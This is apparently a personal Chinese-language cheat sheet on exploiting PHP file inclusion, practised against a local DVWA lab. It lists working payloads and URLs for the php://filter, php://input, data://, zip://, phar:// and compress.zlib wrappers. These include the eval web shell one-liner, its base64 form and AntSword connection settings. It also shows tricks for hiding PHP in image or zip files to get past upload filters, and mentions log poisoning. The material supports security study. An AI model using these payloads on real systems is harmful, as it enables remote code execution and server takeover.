

## original 
http://localhost/vulnerabilities/fi/?page=test.txt



其中test.txt 可以寫
```
<?php phpinfo();?>
```












## php://filter


```
http://localhost/vulnerabilities/fi/?page=php://filter/resource=1111.txt

```
可以讀取txt檔，無法獨取php 檔案中的特殊字元。所以最好加上過濾器



加上過濾器convert.base64-encode

```
php://filter/read=convert.base64-encode/resource=


http://localhost/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=file1.php

```









## php://input


```
http://localhost/vulnerabilities/fi/?page=php://input

```

POST 可以放以下三個payload 測試
```
<?php echo "123";?>

<?php phpinfo(); ?>

<?php @eval($_POST['x']); ?>
```





### 一句話木馬:antsword

URL:
```
http://localhost/vulnerabilities/fi/?page=php://input
```

連接密碼:
`X`


HTTP HEADER:

```
Cookie:PHPSESSID=34ff71fb47a1a917b53b4065a3ebe141; security=low
```


HTTP BODY:
```
<?php @eval($_POST['x']); ?>
```

















## data://

PHP>=5.2.0


```
data://text/plain,<?php phpinfo()?>

http://localhost/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo()?>
```

base64
```
data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=

http://localhost/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=

```

### antsword 連接
```
<?php @eval($_POST['x']); ?> 
轉 base64
PD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOyA/Pg==
```


URL:
```
http://localhost/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOyA/Pg==
```


連接密碼:
`x`


HTTP HEADER:
`Cookie:PHPSESSID=34ff71fb47a1a917b53b4065a3ebe141; security=low`




## compress.zlib://


zlib壓縮會是.gz檔
compress.zlib://test.gz

```
http://localhost/vulnerabilities/fi/?page=compress.zlib://test.gz
```






## zip://


ip伪协议和phar协议类似，但是用法不一样。

使用条件：

1. PHP > =5.3.0（注意在windows下测试要5.3.0<PHP<5.4 才可以）
2. #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。
3. 亂取後綴名(一定要zip 壓縮過在加上任意後綴)


```
index.php?file=zip://test.zip%23test.php
```


* 如果只允許圖片的利用姿勢:
test.php，打包成test.zip，然后再改名为test.jpg
```
index.php?file=zip://test.jpg%23test.php
```


## phar://

壓縮txt to zip  (txt 裡面寫php腳本也可)

```
phar://test.zip/test.zip

http://localhost/vulnerabilities/fi/?page=phar://test.zip/test.txt
```




先壓縮php to zip
```
phar://test.zip/test.zip

http://localhost/vulnerabilities/fi/?page=phar://test.zip/test.php
```



如果只允許圖片的利用姿勢:
test.php，打包成test.zip，然后再改名为test.jpg
```
index.php?file=phar://test.jpg/test.php
```








### antsword

```
http://localhost/vulnerabilities/fi/?page=phar://test2.zip/test2.php (記住如果一開始是php檔壓縮最後一定要同檔名然後解壓成php)
```

or

```
http://localhost/vulnerabilities/fi/?page=phar://test.zip/test.txt (記住如果一開始是txt檔壓縮最後一定要同檔名然後解壓成txt)
```


### 若是需要用圖片後綴繞過也是同道理


```
http://localhost/vulnerabilities/fi/?page=phar://test2.jpg/test2.php (記住如果一開始是php檔壓縮最後一定要同檔名然後解壓成php)
```
 
or

```
http://localhost/vulnerabilities/fi/?page=phar://test.jpg/test.txt (記住如果一開始是txt檔壓縮最後一定要同檔名然後解壓成txt)
```



連接密碼:
`x`

HTTP HEADER:
`Cookie:PHPSESSID=34ff71fb47a1a917b53b4065a3ebe141; security=low`















### 其他: 有點多此一舉的方式，但也是一種思路

cmd 把一句話跟圖片結合

```
copy dog.jpg/b+ hack.php hack.jpg
這樣已經可以被包含了
```



若他判斷圖片的基本格式的話就用這招，但也只能繞過不嚴個圖片檢查

hack.jpg 壓縮成 hack.zip



最後
```
http://localhost/vulnerabilities/fi/?page=phar://hack.zip/hack.jpg  (記住如果一開始是jpg檔壓縮最後一定要同檔名然後解壓成jpg)
```



------------------------------------------------------------------------------------------------








## 另外就是 報錯log 然後找log 的位置，然後包含log 


































## 資源:

https://www.freebuf.com/articles/web/336692.html


http://home.ustc.edu.cn/~xjyuan/blog/2019/02/13/File-Contains-Vulnerability-Summary/#0x07-%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6